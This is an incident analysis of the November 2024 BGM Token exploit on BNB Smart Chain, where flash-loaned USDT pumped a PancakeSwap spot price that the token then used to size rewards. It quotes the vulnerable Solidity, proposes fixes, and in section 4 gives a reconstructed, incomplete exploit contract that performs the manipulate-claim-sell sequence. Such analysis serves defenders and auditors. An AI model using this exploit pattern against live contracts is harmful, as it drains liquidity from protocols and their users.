# BGM Token — AMM Spot Price-Dependent Reward Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-10 |
| **Protocol** | BGM Token |
| **Chain** | BNB Smart Chain (BSC) |
| **Loss** | ~$450,000 (large-scale BGM token theft) |
| **Attacker** | [0x7824...595F](https://bscscan.com/address/0x7824322B220CDB4d51F73782FbcE95E2E2B0595F) |
| **Attack Contract** | [0x00c0...6180](https://bscscan.com/address/0x00c0F54D8Afc60F3aCd06E476Cf504A6f7f06180) |
| **Attack Tx** | [0x8580...fd1](https://bscscan.com/tx/0x8580825008800b9e13266f40b41a838a521e4d0bb4abc1cb78684253b7bc9fd1) |
| **Vulnerable Contract** | [0x4264...b3c2](https://bscscan.com/address/0x42646478b25317160e0dc8db413991277e4bb3c2) (BGM Token) |
| **PancakeSwap Pool** | [0xADC4...6e0a](https://bscscan.com/address/0xADC4eca2a3038B478b591Bac1a87E428625d6e0a) (BGM-USDT LP) |
| **Root Cause** | AMM Spot price used directly as oracle for reward calculation (Vulnerable Price Dependency) |
| **Attack Block** | #43,881,717 (2024-11-10 08:04:24 UTC) |
| **PoC Source** | [DeFiHackLabs / BGM_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/BGM_exp.sol) |

---

## 1. Vulnerability Overview

BGM Token is a token operating on BSC with a multi-level reward system.
The core issue is that when calculating a user's daily reward (earn), the protocol uses the **real-time Spot price** from the PancakeSwap V2 pool as its oracle.

The `updateUserEarn()` function calls `getSwapRouterAmountsOut()` to query the USDT equivalent value of 1 BGM in real time. The higher this price, the more BGM rewards the user receives. The attacker borrowed large amounts of USDT via flash loan, bought BGM from the pool to temporarily spike the Spot price, then claimed rewards based on the inflated price and sold BGM back for a profit.

Vulnerability combination:
- **V-01**: AMM Spot price oracle dependency (CRITICAL) — no defense against flash loan price manipulation
- **V-02**: Batch reward withdrawal after accumulation (HIGH) — rewards calculated at the manipulated price are immediately claimable via `withdraw()`
- **V-03**: Single-transaction manipulation within flash loan (HIGH) — manipulation, claiming, and restoration all complete within the same block

---

## 2. Vulnerable Code Analysis

### 2.1 AMM Spot Price Oracle (Core Vulnerability)

```solidity
// ❌ Vulnerable code: price calculated from real-time reserve ratio of PancakeSwap pool
function getSwapRouterAmountsOut(uint256 _amount) private view returns (uint256) {
    uint256 amountOut;
    address[] memory path = new address[](2);
    path[0] = address(this);   // BGM token
    path[1] = USDT;            // Stablecoin
    // ❌ _swapRouter.getAmountsOut returns the instant price based on pool reserves
    // ❌ Manipulating reserves via flash loan immediately changes this value
    // ❌ No time-weighted average (TWAP), no manipulation detection
    uint256[] memory amounts = _swapRouter.getAmountsOut(_amount, path);
    amountOut = amounts[1];
    return amountOut;
}
```

```solidity
// ✅ Fixed code: use Uniswap V3 TWAP or Chainlink
// Method 1: Apply 30-minute TWAP
function getTokenPriceTWAP(uint256 _amount) private view returns (uint256) {
    // ✅ Time-weighted average price that cannot be manipulated by short-term flash loans
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = 1800; // 30 minutes ago
    secondsAgos[1] = 0;    // now
    (int56[] memory tickCumulatives, ) = IUniswapV3Pool(bgmUsdtPool).observe(secondsAgos);
    int56 tickDiff = tickCumulatives[1] - tickCumulatives[0];
    int24 avgTick = int24(tickDiff / 1800);
    return OracleLibrary.getQuoteAtTick(avgTick, uint128(_amount), address(this), USDT);
}

// Method 2: Use Chainlink price feed (recommended)
function getTokenPriceChainlink(uint256 _amount) private view returns (uint256) {
    // ✅ Off-chain aggregated price — immune to AMM manipulation
    (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
    require(block.timestamp - updatedAt < 3600, "Price feed stale"); // ✅ Staleness check
    return uint256(price) * _amount / 1e8;
}
```

**Problem**: `getAmountsOut()` returns the price instantly calculated from the AMM's current reserve ratio. Executing a large-scale swap via flash loan dramatically shifts the reserve ratio, and calling this function within the same transaction returns the manipulated price. Without TWAP or an external oracle, complete manipulation is possible in a single transaction.

---

### 2.2 Reward Calculation Function — Directly Reflects Manipulated Price

```solidity
// ❌ Vulnerable code: reward amount calculated using manipulated Spot price
function updateUserEarn(address user) private {
    if(lastUpdateTime[user] == 0) {
        lastUpdateTime[user] = block.timestamp;
    }
    uint256 elapsedTime = block.timestamp - lastUpdateTime[user];
    uint256 elapsedCount = elapsedTime / earnInterval;
    if(elapsedCount > 0) {
        lastUpdateTime[user] += elapsedCount * earnInterval;
        // ❌ Manipulated Spot price used directly in reward calculation
        uint256 price = getSwapRouterAmountsOut(1e18);
        // If price is spiked via flash loan, earnToken also spikes
        uint256 earnToken = calcEarn(elapsedCount, _balances[user], price);
        userEarn[user] += earnToken;
        updateInvitorEarn(user, earnToken);
        emit UpdateUserEarn(user, earnToken, elapsedCount, price, _balances[user]);
    }
}
```

```solidity
// ✅ Fixed code: add price manipulation safeguards
function updateUserEarn(address user) private {
    if(lastUpdateTime[user] == 0) {
        lastUpdateTime[user] = block.timestamp;
    }
    uint256 elapsedTime = block.timestamp - lastUpdateTime[user];
    uint256 elapsedCount = elapsedTime / earnInterval;
    if(elapsedCount > 0) {
        lastUpdateTime[user] += elapsedCount * earnInterval;
        // ✅ Use TWAP price
        uint256 price = getTokenPriceTWAP(1e18);
        // ✅ Detect abnormal price deviation (e.g., reject if more than 2x last recorded price)
        require(price <= lastRecordedPrice * 200 / 100, "Price manipulation detected");
        // ✅ Apply reward cap
        uint256 earnToken = calcEarn(elapsedCount, _balances[user], price);
        require(earnToken <= maxEarnPerInterval, "Reward limit exceeded");
        userEarn[user] += earnToken;
        updateInvitorEarn(user, earnToken);
        emit UpdateUserEarn(user, earnToken, elapsedCount, price, _balances[user]);
    }
}
```

---

### 2.3 Reward Withdrawal Function — Allows Immediate Draining

```solidity
// ❌ Vulnerable code: instant withdrawal of manipulated rewards, BGM deducted directly from pool
function _withdraw(address _user) internal {
    updateUserEarn(_user); // ❌ Reward recalculated here using manipulated price
    uint256 earn = userEarn[_user];
    uint256 invitorEarn = userInvitorEarn[_user];
    if(earn > 0) {
        userEarn[_user] = 0;
        // ❌ BGM tokens withdrawn directly from usdtPair (LP pool)
        _update(usdtPair, _user, earn);
        userEarnInfos[_user].tolEarn += earn;
    }
    if(invitorEarn > 0) {
        userInvitorEarn[_user] = 0;
        _update(usdtPair, _user, invitorEarn);
        userEarnInfos[_user].tolInvitorEarn += invitorEarn;
    }
    // ❌ sync() called after balance change — causes pool state inconsistency
    IUniswapV2Pair iPair = IUniswapV2Pair(usdtPair);
    iPair.sync();
}
```

```solidity
// ✅ Fixed code: use separate reward pool, apply withdrawal limit
function _withdraw(address _user) internal {
    updateUserEarn(_user);
    uint256 earn = userEarn[_user];
    uint256 invitorEarn = userInvitorEarn[_user];
    // ✅ Apply withdrawal cooldown (prevent re-withdrawal within 24 hours)
    require(block.timestamp - lastWithdrawTime[_user] >= withdrawCooldown, "Cooldown active");
    lastWithdrawTime[_user] = block.timestamp;
    if(earn > 0) {
        userEarn[_user] = 0;
        // ✅ Withdraw from dedicated reward pool instead of LP pool
        require(rewardPool.balanceOf(address(this)) >= earn, "Insufficient reward pool balance");
        _update(rewardPool, _user, earn);
        userEarnInfos[_user].tolEarn += earn;
    }
    if(invitorEarn > 0) {
        userInvitorEarn[_user] = 0;
        require(rewardPool.balanceOf(address(this)) >= invitorEarn, "Insufficient reward pool balance");
        _update(rewardPool, _user, invitorEarn);
        userEarnInfos[_user].tolInvitorEarn += invitorEarn;
    }
    // ✅ Remove sync() or execute it before withdrawal
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker (0x7824...595F) held BGM tokens in advance (~13,499,460 BGM)
- Attack contract (0x00c0...6180) deployed on BSC (includes function `be0a0cad`)
- Funding source: received funds from FixedFloat Hot Wallet

### 3.2 Execution Phase

```
1. Flash Loan Borrowing
   ┌─────────────────────────────────────────────────────┐
   │  Attacker Contract (0x00c0...6180)                    │
   │  └─► Flash Loan Provider 1 (0x4f31...40Eb)           │
   │       └─► Borrow 14,582,856 USDT                     │
   │  └─► Flash Loan Provider 2 (0x3669...2050)           │
   │       └─► Borrow 43,262,367 USDT                     │
   └─────────────────────────────────────────────────────┘
                            │
                            ▼
2. PancakeSwap Pool Price Manipulation (BGM price spike)
   ┌─────────────────────────────────────────────────────┐
   │  ~57,845,223 USDT injected into BGM-USDT pool        │
   │  (Large-scale BGM purchase)                          │
   │                                                      │
   │  BGM pool reserve change:                            │
   │  Before: High BGM / Low USDT (normal price)          │
   │  After:  Low BGM / High USDT (BGM price spiked)      │
   └─────────────────────────────────────────────────────┘
                            │
                            ▼
3. Reward Calculation Manipulation
   ┌─────────────────────────────────────────────────────┐
   │  BGM._transfer() called (used as trigger)            │
   │  └─► updateUserEarn(attacker)                        │
   │       └─► getSwapRouterAmountsOut(1e18)              │
   │            └─► PancakeSwap.getAmountsOut()           │
   │                 └─► Returns spiked price (e.g., 10x normal) │
   │       └─► calcEarn(elapsed time, balance, spiked price)     │
   │            └─► Up to 10x normal rewards accumulated  │
   └─────────────────────────────────────────────────────┘
                            │
                            ▼
4. Reward Withdrawal (inflated BGM received)
   ┌─────────────────────────────────────────────────────┐
   │  BGM.withdraw() called                               │
   │  └─► _withdraw(attacker)                             │
   │       └─► userEarn reset                             │
   │       └─► BGM transferred from usdtPair (LP pool) to attacker │
   │            → Receive 320,653,620 + 671,576,831 BGM   │
   │       └─► iPair.sync() — forced pool state sync      │
   └─────────────────────────────────────────────────────┘
                            │
                            ▼
5. BGM Sell + Flash Loan Repayment
   ┌─────────────────────────────────────────────────────┐
   │  Received BGM → swapped to USDT on PancakeSwap      │
   │  Flash loan repaid (principal + fees)                │
   │  Remaining USDT = attacker profit (~$450,000)        │
   └─────────────────────────────────────────────────────┘
```

### 3.3 Attack Flow Diagram (Full)

```
Attacker EOA
(0x7824...595F)
      │
      │ tx: 0x8580...fd1
      ▼
┌─────────────────────┐
│  Attack Contract     │
│  0x00c0...6180      │
└────────┬────────────┘
         │ 1) flashLoan(~57.8M USDT)
         ├──────────────────────────────────────────────┐
         │                                              ▼
         │                               ┌─────────────────────────┐
         │                               │ Flash Loan Providers 1, 2 │
         │                               │ 0x4f31...40Eb            │
         │                               │ 0x3669...2050            │
         │                               └─────────────────────────┘
         │ 2) Large-scale USDT → BGM purchase (price manipulation)
         ▼
┌─────────────────────────────────┐
│  PancakeSwap V2                  │
│  BGM-USDT LP                     │
│  0xADC4...6e0a                   │
│                                  │
│  [Normal] BGM:USDT = N:1         │
│  [Manipulated] BGM:USDT = N/10:10│ ← BGM price spiked
└────────────────┬────────────────┘
                 │ getAmountsOut returns manipulated price
                 ▼
┌─────────────────────────────────┐
│  BGM Token Contract              │
│  0x4264...b3c2                   │
│                                  │
│  updateUserEarn():               │
│  price = getSwapRouterAmountsOut │ ← Receives spiked price
│  earnToken = calcEarn(×price)    │ ← Reward amount inflated
│                                  │
│  withdraw():                     │
│  _update(usdtPair → attacker)    │ ← BGM drained from LP pool
└────────────────┬────────────────┘
                 │ 3) 671M+ BGM received
                 ▼
┌─────────────────────────────────┐
│  Attack Contract                 │
│  BGM → USDT sell                 │
│  Flash loan repaid               │
│  Net profit ~$450,000 obtained   │
└─────────────────────────────────┘
                 │
                 ▼
     Profit transferred to Attacker EOA
```

### 3.4 Outcome

| Item | Amount |
|------|------|
| Flash loan borrowed | ~57,845,223 USDT |
| BGM obtained | 671,576,831 BGM (including additional 320M+) |
| BGM sent to burn address | 641,307,240 BGM (burn) |
| Attacker net profit | ~$450,000 |
| Protocol LP pool damage | Most BGM-USDT liquidity drained |

---

## 4. PoC Code Core Logic (Reconstructed Estimate)

The actual `BGM_exp.sol` file exists in the DeFiHackLabs repository. The following is an attack flow reconstructed based on on-chain data and the `vETH_exp.sol` pattern and event logs that caused similar ~$450K in damage.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo
// Attacker : 0x7824322B220CDB4d51F73782FbcE95E2E2B0595F
// Attack Contract : 0x00c0F54D8Afc60F3aCd06E476Cf504A6f7f06180
// Vulnerable Contract : 0x42646478b25317160e0dc8db413991277e4bb3c2 (BGM Token)
// Attack Tx : 0x8580825008800b9e13266f40b41a838a521e4d0bb4abc1cb78684253b7bc9fd1
// Block : 43881717

interface IBGM {
    function withdraw() external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BGMExploit {
    IBGM constant BGM = IBGM(0x42646478b25317160e0dc8db413991277e4bb3c2);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function attack() external {
        // [Step 1] Flash loan: borrow large amount of USDT
        // Borrow total ~57.8M USDT from 0x4f31...40Eb and 0x3669...2050
        flashLoanProvider1.flashLoan(14_582_856e18, address(this), "");
        flashLoanProvider2.flashLoan(43_262_367e18, address(this), "");
    }

    function onFlashLoan(uint256 amount, ...) external {
        // [Step 2] Buy large amount of BGM with borrowed USDT → manipulate Spot price
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(BGM);
        // Large purchase changes BGM-USDT pool reserve ratio → BGM price spikes
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );

        // [Step 3] Call BGM transfer → trigger updateUserEarn
        // updateUserEarn() is called inside _transfer(),
        // reward amount calculated at spiked price and accumulated in userEarn
        BGM.transfer(address(this), BGM.balanceOf(address(this)));

        // [Step 4] Immediately withdraw accumulated rewards
        // withdraw() → _withdraw() → receive BGM from LP pool
        BGM.withdraw();

        // [Step 5] Sell obtained BGM back to USDT (price restored)
        path[0] = address(BGM);
        path[1] = address(USDT);
        uint256 bgmBalance = BGM.balanceOf(address(this));
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bgmBalance, 0, path, address(this), block.timestamp
        );

        // [Step 6] Repay flash loan
        USDT.transfer(msg.sender, amount + fee);
        // Remaining USDT = attack profit (~$450,000)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | AMM Spot price oracle dependency | CRITICAL | CWE-1192 | `04_oracle_manipulation.md` - Pattern 1 |
| V-02 | Reward manipulation possible within flash loan | CRITICAL | CWE-841 | `02_flash_loan.md` - Pattern 1 |
| V-03 | No reward withdrawal limit | HIGH | CWE-400 | `17_staking_reward.md` |
| V-04 | Direct reward withdrawal from LP pool | HIGH | CWE-284 | `16_accounting_sync.md` |

### V-01: AMM Spot Price Oracle Dependency

- **Description**: `getSwapRouterAmountsOut()` calls PancakeSwap V2's `getAmountsOut()` to return the instant price based on current reserves. This price can be immediately manipulated by a large-scale swap within the same transaction.
- **Impact**: The price basis for reward calculation can be manipulated several to tens of times, allowing far more BGM to be received as rewards than normal.
- **Attack Conditions**: Flash loan access + BGM token holdings + sufficient reward accumulation time elapsed

### V-02: Reward Manipulation Possible Within Flash Loan

- **Description**: Since flash loan borrowing and repayment occur within a single transaction, the entire sequence of price manipulation → reward claiming → price restoration completes within one transaction.
- **Impact**: The manipulated price is restored after the block ends, but reward claiming completes in the interim.
- **Attack Conditions**: Callback structure within the transaction (e.g., onFlashLoan)

### V-03: No Reward Withdrawal Limit

- **Description**: The `calcEarn()` function calculates rewards as elapsed time × balance × price, with no upper bound on the amount claimable in a single transaction.
- **Impact**: Most BGM in the reward pool (LP pool) can be drained in a single transaction.
- **Attack Conditions**: Maximized when combined with V-01

### V-04: Direct Reward Withdrawal from LP Pool

- **Description**: `_withdraw()` deducts rewards directly from `usdtPair` (LP pool address) via `_update()` rather than from a `rewardPool`. This causes a discrepancy between the LP pool's actual balance and its internal reserve records, which is then force-synced via `sync()`.
- **Impact**: BGM liquidity in the LP pool is consumed for reward payouts, causing collateral damage to ordinary users' liquidity.
- **Attack Conditions**: Combined with V-01 through V-03

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 Introduce TWAP Oracle

```solidity
// ✅ 30-minute TWAP price query based on Uniswap V3
function getTokenPriceTWAP(uint256 _amount) private view returns (uint256) {
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = 1800; // 30 minutes ago
    secondsAgos[1] = 0;
    (int56[] memory tickCumulatives, ) = IUniswapV3Pool(bgmPool).observe(secondsAgos);
    int24 avgTick = int24((tickCumulatives[1] - tickCumulatives[0]) / 1800);
    // Manipulating the price over 30 minutes requires enormous capital and sustained pressure
    return OracleLibrary.getQuoteAtTick(avgTick, uint128(_amount), address(this), USDT);
}
```

#### 6.2 Add Price Deviation Guard

```solidity
// ✅ Reject reward calculation if price exceeds 2x last recorded price
uint256 private lastRecordedPrice;
uint256 private constant MAX_PRICE_DEVIATION = 200; // 200% (2x)

function updateUserEarn(address user) private {
    // ...
    uint256 price = getTokenPriceTWAP(1e18);
    if (lastRecordedPrice > 0) {
        require(
            price <= lastRecordedPrice * MAX_PRICE_DEVIATION / 100,
            "BGM: Abnormal price detected"
        );
    }
    lastRecordedPrice = price;
    // ...
}
```

#### 6.3 Apply Reward Cap and Cooldown

```solidity
// ✅ Single withdrawal limit + 24-hour cooldown
uint256 public constant MAX_EARN_PER_WITHDRAW = 10_000e18; // In BGM terms
uint256 public constant WITHDRAW_COOLDOWN = 24 hours;
mapping(address => uint256) public lastWithdrawTime;

function _withdraw(address _user) internal {
    require(
        block.timestamp - lastWithdrawTime[_user] >= WITHDRAW_COOLDOWN,
        "BGM: Withdrawal cooldown active"
    );
    lastWithdrawTime[_user] = block.timestamp;

    updateUserEarn(_user);
    uint256 earn = userEarn[_user];
    require(earn <= MAX_EARN_PER_WITHDRAW, "BGM: Withdrawal limit exceeded");
    // ...
}
```

#### 6.4 Operate a Dedicated Reward Pool

```solidity
// ✅ Withdraw from dedicated reward pool instead of LP pool
address public rewardPool; // Dedicated reward pool address

function _withdraw(address _user) internal {
    // ...
    if(earn > 0) {
        userEarn[_user] = 0;
        // ✅ Pay from reward pool instead of LP pool (usdtPair)
        require(
            IBGM(address(this)).balanceOf(rewardPool) >= earn,
            "BGM: Insufficient reward pool balance"
        );
        _update(rewardPool, _user, earn);
    }
    // Remove sync() or execute before withdrawal
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| AMM Spot price dependency | Replace with Chainlink price feed + TWAP dual verification |
| Flash loan price manipulation | Block reward calculation within the same block (use lastUpdateBlock) |
| No reward limit | Introduce daily reward cap + per-user withdrawal limit |
| Direct LP pool withdrawal | Operate independent dedicated reward pool (Treasury) |
| Multi-level referral rewards | Apply same price manipulation protection to referral rewards |

---

## 7. Lessons Learned

1. **Do not use AMM Spot prices as oracles**: Prices calculated from `getAmountsOut()` or `getReserves()` can be freely manipulated within the same transaction via flash loans. For financially sensitive calculations such as reward computation, collateral valuation, and liquidation thresholds, always use TWAP (minimum 30 minutes) or manipulation-resistant oracles such as Chainlink.

2. **Decouple reward calculation from external price feeds**: A structure where reward amounts are directly tied to real-time market prices creates an extremely high incentive for manipulation. It is safer to use internal variables independent of price fluctuations (e.g., fixed APR, snapshot prices) as the basis for reward calculation.

3. **Account for single-transaction attacks within flash loans**: All price-dependent logic should be designed under the assumption that "an attacker can set the price arbitrarily within the same transaction." Checking the block number (`lastUpdateBlock != block.number`) to block duplicate execution within the same block can defend against most flash loan attacks.

4. **Clearly separate the reward funding source**: Deducting rewards directly from the LP pool unintentionally makes liquidity providers the reward source. A separate reward pool (Treasury) should be operated with explicitly allocated reward budgets.

5. **Similar patterns propagate across entire multi-level systems**: In a structure like BGM with 20 levels of referral rewards, if upper-level rewards are manipulated, lower-level rewards are also manipulated in a cascade. The more complex the multi-level reward structure, the more strictly price-based calculations susceptible to manipulation must be prohibited.

6. **Small-cap tokens in the BSC ecosystem are especially vulnerable**: The lower the liquidity in an AMM pool, the greater the Spot price movement achievable with less capital. Regardless of liquidity size, Spot price-dependent design should be avoided entirely.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Field | Value |
|------|-----|
| Attack Tx | [0x8580...fd1](https://bscscan.com/tx/0x8580825008800b9e13266f40b41a838a521e4d0bb4abc1cb78684253b7bc9fd1) |
| Block Number | #43,881,717 |
| Timestamp | 2024-11-10 08:04:24 UTC |
| From (Attacker) | 0x7824322B220CDB4d51F73782FbcE95E2E2B0595F |
| To (Attack Contract) | 0x00c0F54D8Afc60F3aCd06E476Cf504A6f7f06180 |
| Called Function | `0xbe0a0cad` |
| Total Transfer Events | 26 |

### 8.2 On-Chain Event Log Sequence (Key Events)

| Order | Event | Description |
|------|--------|------|
| 1 | FlashLoan | 0x4f31...40Eb → Attack contract, 14,582,856 USDT |
| 2 | FlashLoan | 0x3669...2050 → Attack contract, 43,262,367 USDT |
| 3 | Swap (USDT→BGM) | ~57.8M USDT total used for large BGM purchase → Spot price manipulated |
| 4 | Transfer (BGM) | BGM token transfer called → updateUserEarn triggered |
| 5 | UpdateUserEarn | Rewards accumulated at spiked price |
| 6 | Transfer | usdtPair → 0xeFA4...49f, 671,576,831 BGM (reward withdrawal) |
| 7 | Transfer | usdtPair → Attack contract, 320,653,620 BGM |
| 8 | Transfer | 641,307,240 BGM → burn address (0x000...dEaD) |
| 9 | Sync | LP pool reserve force-synced |
| 10 | Swap (BGM→USDT) | Obtained BGM sold |
| 11 | Repay | Flash loan repaid (principal + fees) |

### 8.3 Key Address Verification

| Role | Address | BscScan Label |
|------|------|----------------|
| Attacker EOA | [0x7824...595F](https://bscscan.com/address/0x7824322B220CDB4d51F73782FbcE95E2E2B0595F) | BGM Exploiter 1 (reported by TenArmor) |
| Attack Contract | [0x00c0...6180](https://bscscan.com/address/0x00c0F54D8Afc60F3aCd06E476Cf504A6f7f06180) | Unverified contract |
| BGM Token | [0x4264...b3c2](https://bscscan.com/address/0x42646478b25317160e0dc8db413991277e4bb3c2) | BGM Token |
| BGM-USDT LP | [0xADC4...6e0a](https://bscscan.com/address/0xADC4eca2a3038B478b591Bac1a87E428625d6e0a) | PancakeSwap V2 BGM-BSC-USD |
| Flash Loan 1 | [0x4f31...40Eb](https://bscscan.com/address/0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb) | Flash loan provider |
| Flash Loan 2 | [0x3669...2050](https://bscscan.com/address/0x36696169C63e42cd08ce11f5deeBbCeBae652050) | Flash loan provider |
| Secondary Recipient | [0xeFA4...49f](https://bscscan.com/address/0xeFA4bCE444C09a52941bEEf5FE8264D70534049f) | BGM reward receiving address |

### 8.4 BGM Token Contract Verification Status

The BGM token contract (0x4264...b3c2) has verified source code on BscScan, and the core vulnerable functions have been confirmed:
- `getSwapRouterAmountsOut()`: Direct AMM Spot price query — **vulnerability confirmed**
- `updateUserEarn()`: Reward calculation using manipulated price — **vulnerability confirmed**
- `_withdraw()`: Direct BGM withdrawal from `usdtPair` followed by `sync()` — **vulnerability confirmed**

---

## 9. References

- [BscScan Attack Transaction](https://bscscan.com/tx/0x8580825008800b9e13266f40b41a838a521e4d0bb4abc1cb78684253b7bc9fd1)
- [Guardrail Threat Intel - BGM Token](https://guardrail.gitbook.io/cached-v2/threat-intel/incident-summaries/2024-11.10-bgm-token-vulnerable-price-dependency)
- [Nominis - November 2024 Security Incidents](https://www.nominis.io/insights/crypto-security-incidents-november-2024)
- [DeFiHackLabs Repository](https://github.com/SunWeb3Sec/DeFiHackLabs)
- [04_oracle_manipulation.md - Pattern 1: AMM Spot Price Dependency](/home/gegul/skills/patterns/04_oracle_manipulation.md)
- [02_flash_loan.md - Pattern 1: Flash Loan Price Manipulation](/home/gegul/skills/patterns/02_flash_loan.md)
- [Similar Case: Pancake Bunny $45M (2021)](https://medium.com/amber-group/bsc-flash-loan-attack-pancakebunny-3361b6d814fd) — AMM LP price dependency
- [Similar Case: Harvest Finance $34M (2020)](https://github.com/SunWeb3Sec/DeFiHackLabs) — Curve pool price oracle usage